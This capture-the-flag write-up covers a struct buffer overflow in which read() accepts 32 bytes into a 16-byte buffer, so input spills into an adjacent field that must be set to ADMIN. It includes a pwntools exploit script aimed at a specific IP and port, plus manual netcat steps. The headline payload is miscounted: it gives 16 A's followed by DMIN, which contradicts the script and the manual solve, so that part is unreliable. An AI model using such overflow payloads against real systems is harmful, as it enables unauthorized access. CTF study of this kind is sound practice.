# Buffer Visualizer

This is a classic **Buffer Overflow** challenge. The "visualizer" is actually showing you the memory layout in real-time, which makes this very intuitive to solve.

### **The Vulnerability**

Look at the `struct Task` and the `read` function:

**C**

`struct Task {
    char buffer[16]; // 16 bytes
    char target[8];  // 8 bytes
};

...
int n = read(0, t.buffer, 32); // The Bug!`

The `buffer` is only **16 bytes** long, but the `read` function allows you to input up to **32 bytes**. Because the `target` variable is defined immediately after `buffer` in the struct, the extra bytes you type will "overflow" out of `buffer` and write directly into `target`.

### **The Memory Layout**

Based on your `nc` output, here is how the memory is sitting:

- **Bytes 0-15:** `buffer` (16 dots)
- **Bytes 16-23:** `target` (Starts as `GUEST`)

To get the flag, you need `target` to contain the string `ADMIN`.

### **The Solution**

You need to provide 16 bytes of "filler" (it doesn't matter what they are) to fill up the `buffer`, followed immediately by the word `ADMIN`.

**The Payload:**`AAAAAAAAAAAAAAAADMIN`*(16 'A's followed by ADMIN)*

### **Why this works:**

1. The first 16 'A's fill `t.buffer[0]` through `t.buffer[15]`.
2. The very next character you type ('A') will land in `t.target[0]`.
3. The rest of the characters ('D', 'M', 'I', 'N') will fill `t.target[1]` through `t.target[4]`.

---

### **Python Exploit Script**

Since this is a simple string input, you can just type it in the netcat session, but here is a script using `pwntools` to automate it:

**Python**

`from pwn import *

**Connection details**

HOST = '133.88.122.244'
PORT = 30766

def solve():
    io = remote(HOST, PORT)

    # 1. Wait for the prompt
    io.recvuntil(b"Input: ")

    # 2. Construct the payload
    # 16 bytes of padding + 'ADMIN'
    padding = b"A" * 16
    target_value = b"ADMIN"
    payload = padding + target_value

    log.info(f"Sending payload: {payload}")
    io.sendline(payload)

    # 3. Read the output and flag
    response = io.recvall().decode()
    print(response)

if __name__ == "__main__":
    solve()`

### **Manual Solve**

If you want to do it manually in your open `nc` terminal:

1. When it says `Input:`, type: `AAAAAAAAAAAAAAAAADMIN`
2. Press Enter.
3. The visualizer will show `A A A A A A A A A A A A A A A A A D M I N . . .` and trigger the flag!
